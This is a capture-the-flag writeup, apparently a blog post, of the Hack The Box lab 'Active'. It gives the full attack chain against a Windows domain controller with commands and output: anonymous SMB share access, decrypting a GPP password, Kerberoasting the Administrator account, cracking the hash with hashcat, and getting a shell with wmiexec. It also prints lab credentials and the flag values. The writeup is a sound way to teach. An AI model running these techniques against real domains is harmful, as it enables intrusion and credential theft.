---
layout: post
title:  "Active (HackTheBox) Writeup"
date:   2026-01-29 13:00:00 +0530
categories: [HackTheBox, Active Directory]
---


**Active** is a Hack The Box (HTB) Windows Active Directory machine that focuses on SMB enumeration, Group Policy Objects (GPOs), and credential discovery. This machine is ideal for beginners in Active Directory exploitation and highlights why poor GPO hygiene can completely break domain security.

**HackTheBox – Active:**  [Active](https://app.hackthebox.com/machines/Active)

 
## Enumeration

Starting with the nmap scan.

```
❯ nmap -p 1-10000 -sCV -O -T4 10.129.60.180

Nmap scan report for 10.129.60.180
Host is up (0.99s latency).
Not shown: 9987 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-29 04:50:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5722/tcp open  msrpc         Microsoft Windows RPC
9389/tcp open  mc-nmf        .NET Message Framing
Aggressive OS guesses: Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (97%), Microsoft Windows Server 2012 R2 (96%), Microsoft Windows 7 SP1 (95%), Microsoft Windows Vista Home Premium SP1, Windows 7, or Windows Server 2008 (95%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 (94%), Microsoft Windows Windows 7 SP1 (94%), Microsoft Windows 7 or Windows Server 2008 R2 or Windows 8.1 (94%), Microsoft Windows Vista SP1 (94%), Microsoft Windows 7 Enterprise SP1 (93%), Microsoft Windows Server 2008 R2 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-29T04:52:09
|_  start_date: 2026-01-29T04:34:08
|_clock-skew: -1m54s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1048.66 seconds

```

The result showed that the target is a Windows Active Directory Domain Controller. The domain was identified as **active.htb**.
Its running **Windows Server 2008 R2 SP1**, with  AD services running.


## SMB Enumeration

My next step was enumerating smb shares using **enum4linux**. The scan revealed multiple standard domain shares, with the **Replication** share being readable without authentication.

```
❯ enum4linux -a 10.129.60.180

                     Share Enumeration on 10.129.60.180 

do_connect: Connection to 10.129.60.180 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                                         

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.129.60.180                                                                                                                 
//10.129.60.180/ADMIN$  Mapping: DENIED Listing: N/A Writing: N/A              //10.129.60.180/C$      Mapping: DENIED Listing: N/A Writing: N/A
//10.129.60.180/IPC$    Mapping: OK Listing: DENIED Writing: N/A
//10.129.60.180/NETLOGON        Mapping: DENIED Listing: N/A Writing: N/A
//10.129.60.180/Replication     Mapping: OK Listing: OK Writing: N/A
//10.129.60.180/SYSVOL  Mapping: DENIED Listing: N/A Writing: N/A
//10.129.60.180/Users   Mapping: DENIED Listing: N/A Writing: N/A

```

Using **smbclient**, I enumerated the contents of the **Replication** share. During enumeration, I discovered an **`active.htb`** directory containing a file named **`Groups.xml`**. I downloaded this file to my local machine. Upon inspecting, I found some interesting information, including a user named **`SVC_TGS`** with an **encrypted password**.

```
❯ smbclient //10.129.60.180/replication
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 16:07:44 2018
  ..                                  D        0  Sat Jul 21 16:07:44 2018
  active.htb                          D        0  Sat Jul 21 16:07:44 2018

smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 16:07:44 2018
  ..                                  D        0  Sat Jul 21 16:07:44 2018
  Groups.xml                          A      533  Thu Jul 19 02:16:06 2018

                5217023 blocks of size 4096. 284339 blocks available

```

```
groups.xml

<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

I decrypted the password using **gpp-decrypt**, which leverages the **publicly known Group Policy Preferences (GPP) encryption key** to recover plaintext credentials.

```
❯ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ

GPPstillStandingStrong2k18

```

```
user :SVC_TGS
password: GPPstillStandingStrong2k18
```

Earlier during SMB enumeration, the **`Users`** share was identified but was not accessible anonymously. After recovering valid domain credentials for **`SVC_TGS`**, I revisited this share to check if authenticated access was possible.

Using **smbclient** with the obtained credentials, I was able to successfully connect to the **Users** share and I was able to retrieve the **user flag**.

```
❯  smbclient //10.129.60.180/Users -U SVC_TGS
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 20:09:20 2018
  ..                                 DR        0  Sat Jul 21 20:09:20 2018
  Administrator                       D        0  Mon Jul 16 15:44:21 2018
  All Users                       DHSrn        0  Tue Jul 14 10:36:44 2009
  Default                           DHR        0  Tue Jul 14 12:08:21 2009
  Default User                    DHSrn        0  Tue Jul 14 10:36:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 10:27:55 2009
  Public                             DR        0  Tue Jul 14 10:27:55 2009
  SVC_TGS                             D        0  Sat Jul 21 20:46:32 2018
c
                5217023 blocks of size 4096. 260061 blocks available
smb: \> cd SVC_TGS\Desktop
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit
```

```
❯ cat user.txt
e2226c40521299cb1bc8e584a1112f38
```

## Privilege Escalation 

With known credentials for our user SVC_TGS, the next step was to check for **Service Principal Names (SPNs)** that could be abused with **Kerberoasting**. 
The results revealed **Administrator** account and the next step would be cracking the hash. 

```
❯ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.60.180 -request

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2026-01-29 10:05:05.390937             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$bfadce3954788a47ba97a003939a63e1$572a046dacca9315c2f66400ca609738acca5c66d866040bd9c3fb7675e4e93ef340aa4d5a22cfcd1a3895bf002b5a00ec93fcfad377740d7ab5da2b230f10658e806c34e0fdd00a51b150e59ef4a88eedfea9c480907bd07c874c38fd6df9237ea39a3e4dd5d546b3a444185b7ee7b1035fea92f57346aeeaa850ac36317b0004ce88b9825225f7cc1f0a4d1d96b822ef454059e919d7fc1aa22ef019d22109295f8783debbb406175b49d67e79200e91e48503d38e247c6c6018f6e2d8e4171ee10168ea810200c9e28942a6a606dce2ad9a08bf0fa1b63828808aff8d78317fec7300e82d55d1132b5f0a572d20cbaef739e86bad904ca5d4dc668caa14b48b61ef17356839d87497c54a42acf944319e86ea0b5b0a0a32662017d8b1b8303cfa265013726d415da0b58227878e121807ddf56ff9c36688fa3ea16c1c0511066ba9dbdbe676316623e91e14f554ef4009cac9504862d8c96fba552bc0d86dd7c80ac9d95f330c129700c5717361218b8d4b846f80502af02ab23f9744e59ea68d8a846ee041862fc37c867c174cbb85e3c2b8e6a7b85333c187799e3b6db8e5f5d0914a8c0b55389a934ae4e5bd6d0838fada4e0f0a7176ff3dc6fd02d5443b6cb36c7a6a5fb13cca8154d0670b1c8ec5fc4ec557d0588597cfc578a943c8ac51ed2ea0551b57bbe6176ce046fe529099718f99e77a30bff784dd32bb0fd8d8bb02a05682f6deb1bac87eaa45c2bfec1133e8feb307838c7ee3f04983d21167dfd82d22ddef9d164dd7c82a02a981476abe47d62bad2274d8bc171c2f085c35ad851631f94ac5c97c4c803e520d825ffbe07cd8cb53d3be6698a1b473f7d60440ce32ef31b3038d35df028713735652ee4d6c9d0cbdf3ced651729edda167d3f38990de4335516a59e53872c495737a207553b1add3c4e5b3f1dad91f5593d69347dbd7b9fbe3fd6fe4b47f913900214302d7abfe6784a232d32d03bb0cdc012e51ff498b2be49ba2d7a8318044ac3b97351d1f0b585def29e0c201805b242c2089e2595f655e4fd6c5c9ebd584803defccd3893b6a3cf09a5cc8f7e4fdd9469cd0ed4c545d0092721e4c6521e7d07262b7acfbefa3213ce86a9bebb6bf4ac81854fd22a4af3f8b24548c67fabe524f65a814e4895d9488903ddf5392dfdec1019a421085839cbf44bd018293b8507b809517a9e415caa033a6658fc2efabd30424ed002b1ca2fa6746ad1bd860246cdfd5ec8b0c4a3ba935

```

Using **hashcat** to crack the administrator hash and boom we got our password. 

```
❯ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt

password : Ticketmaster1968

```

On to the final step, using Administrator credentials I can get the shell with **wmiexec**. The root flag was retrieved from the administrator’s desktop.

```
❯ wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.60.180

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\Users\Administrator\Desktop>type root.txt
2d878d1a3336d8abd9b09640204622aa

```